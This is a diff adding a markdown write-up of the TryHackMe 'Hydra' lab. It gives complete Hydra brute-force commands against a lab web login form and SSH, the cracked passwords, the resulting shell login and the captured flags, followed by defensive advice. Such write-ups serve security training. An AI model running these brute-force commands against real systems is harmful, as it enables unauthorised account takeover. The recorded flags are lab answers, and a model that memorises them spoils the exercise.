@@ -1,0 +1,141 @@
+# Hydra — TryHackMe
+
+> Learn how to use Hydra to brute-force credentials against web login forms and SSH.
+
+**Room:** https://tryhackme.com/room/hydra  
+**Difficulty:** Easy  
+**Category:** Offensive Security Tooling / Password Cracking  
+**Completed:** 04 June 2026
+
+---
+
+## Summary
+
+This room introduces Hydra, an online brute-force tool used to automate password guessing against live services. Two attacks were performed against the target: a HTTP POST form brute-force to compromise a web login, and an SSH brute-force to gain shell access. Both used the `rockyou.txt` wordlist and a known username (`molly`).
+
+## Tools Used
+
+- `hydra` — online brute-force / password cracking
+- `ssh` — remote shell access
+- `rockyou.txt` — password wordlist (`/usr/share/wordlists/rockyou.txt`)
+
+---
+
+## Task 1 — Hydra Introduction
+
+No flags. Theory only.
+
+Hydra automates credential guessing against live services. It supports many protocols including SSH, FTP, HTTP, HTTPS, SMB, and more.
+
+**General syntax:**
+```bash
+hydra -l <username> -P <wordlist> <IP> <service>
+```
+
+Key flags:
+
+| Flag | Meaning |
+|------|---------|
+| `-l` | Single username |
+| `-L` | Username list |
+| `-p` | Single password |
+| `-P` | Password list |
+| `-t 4` | Limit threads (important for SSH) |
+| `-V` | Verbose — show each attempt |
+
+---
+
+## Task 2 — Flag 1: Web Form Brute-Force
+
+**Target:** `http://10.146.155.164/login`  
+**Username:** `molly`  
+**Wordlist:** `rockyou.txt`
+
+### How HTTP POST form syntax works
+
+```
+/login:username=^USER^&password=^PASS^:Your username or password is incorrect
+```
+
+Three parts separated by `:`:
+1. **Login path** — `/login`
+2. **POST body** — form fields with `^USER^` and `^PASS^` as placeholders
+3. **Fail string** — text that appears on a failed login; Hydra stops when this is absent
+
+### Command
+
+```bash
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.146.155.164 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect"
+```
+
+### Output
+
+```
+[80][http-post-form] host: 10.146.155.164   login: molly   password: sunshine
+1 of 1 target successfully completed, 1 valid password found
+```
+
+**Credentials:** `molly:sunshine`  
+Logged into the web app → flag displayed on page.
+
+**Flag 1:** `THM{2d28b0e5e3c5b30ca74c6773cd2df328}`
+
+---
+
+## Task 3 — Flag 2: SSH Brute-Force
+
+**Target:** `10.146.155.164:22`  
+**Username:** `molly`  
+**Wordlist:** `rockyou.txt`
+
+### Command
+
+```bash
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.146.155.164 ssh
+```
+
+> Note: SSH rate-limits parallel connections. Use `-t 4` if you get errors.
+
+### Output
+
+```
+[22][ssh] host: 10.146.155.164   login: molly   password: butterfly
+1 of 1 target successfully completed, 1 valid password found
+```
+
+**Credentials:** `molly:butterfly`
+
+### Shell access
+
+```bash
+ssh molly@10.146.155.164
+# password: butterfly
+
+cat flag2.txt
+```
+
+**Flag 2:** `THM{c8eeb0468febbadea859baeb33b2541b}`
+
+---
+
+## Lessons Learned
+
+- Hydra's `http-post-form` syntax requires inspecting the login request first (DevTools → Network tab) to identify the POST body fields and failure string
+- SSH brute-forcing should use `-t 4` to avoid connection errors from rate limiting
+- Weak, common passwords (`sunshine`, `butterfly`) appear early in `rockyou.txt` — real targets are found in seconds
+- A known username dramatically reduces the search space; username enumeration is often the step before brute-forcing
+
+## Defender's Perspective
+
+- Enforce strong, unique passwords — common passwords are cracked in seconds with rockyou.txt
+- Implement account lockout or rate limiting on login endpoints
+- Use fail2ban or similar on SSH to block IPs after repeated failures
+- Disable password authentication on SSH entirely — use key-based auth only
+- Enable MFA on web logins
+
+---
+
+## References
+
+- https://tryhackme.com/room/hydra
+- https://github.com/vanhauser-thc/thc-hydra
